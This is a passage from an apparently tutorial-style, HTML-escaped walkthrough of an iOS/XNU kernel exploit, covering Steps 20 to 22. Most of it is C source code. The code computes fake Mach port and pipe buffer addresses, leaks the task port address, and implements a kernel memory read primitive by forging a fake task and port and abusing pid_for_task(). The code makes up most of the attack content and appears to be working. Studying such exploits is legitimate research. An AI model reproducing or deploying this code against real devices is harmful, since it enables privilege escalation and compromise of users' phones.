    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-20-compute-the-address-of-the-fake-port&quot;&gt;Step 20: Compute the address of the fake port&lt;/h4&gt;

&lt;p&gt;Since we know the &lt;strong&gt;base_port&lt;/strong&gt; address and given the fact that we know the offset from the base port to the fake port (we defined this earlier in Step 3), it is possible for us to calculate the fake port address.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 20\. Now use base_port_address to compute the address of the fake port and the containing&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// pipe buffer, and choose an offset for our fake task in the pipe buffer as well. At this&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// point, we can now use our stage 1 read primitive.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;fake_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port_to_fake_port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;pipe_buffer_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FAKE_TASK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FAKE_TASK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-21-compute-the-address-of-your-own-task-port&quot;&gt;Step 21: Compute the address of your own task port&lt;/h4&gt;

&lt;p&gt;Now that we know the address of the fake task and we can create the port, we can create a better read primitive and call it stage 1. The next step is to compute the address of your own task port. The function &lt;strong&gt;stage1_find_port_address&lt;/strong&gt; takes the input as a task and gets the address of the task port using the stage 1 read primtive.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 21\. Now that we have the address of our pipe buffer, we can use the stage 1 read&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// primitive. Get the address of our own task port, which we'll need later.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_find_port_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*
     * stage1_find_port_address
     *
     * Description:
     * 	Get the address of a Mach port to which we hold a send right.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;stage1_find_port_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Create the message. We'll place a send right to the target port in msgh_local_port.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_COPY_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Send the message to the base port.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    			&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_TIMEOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    			&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mach_msg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not stash our port in a message to the base port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Read the address of the kmsg.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port_imq_messages&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imq_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_port_imq_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Read the message's msgh_local_port field to get the address of the target port.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// +-----------------+---+--------+---------+&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// | struct ipc_kmsg |   | header | trailer |&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// +-----------------+---+--------+---------+&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_size_for_message_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    		&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_HEADER_SIZE_DELTA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    		&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage1_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Discard the message.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;port_discard_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*
     * stage1_read32
     *
     * Description:
     * 	Read a 32-bit value from kernel memory using our fake port.
     *
     * 	This primitive requires that we know the address of the pipe buffer containing our port.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;stage1_read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Do a read to make the pipe available for a write.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;read_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Create our fake task. The task's proc's p_pid field overlaps with the address we want to&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// read.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_proc_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bsd_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_proc_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Initialize the port as a fake task port pointing to our fake task.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_makebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Write our buffer to kernel memory.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;write_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Now use pid_for_task() to read our value.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pid_for_task&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not read kernel memory in stage %d using %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pid_for_task&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-22-get-the-address-of-the-host-port&quot;&gt;Step 22: Get the address of the Host port&lt;/h4&gt;

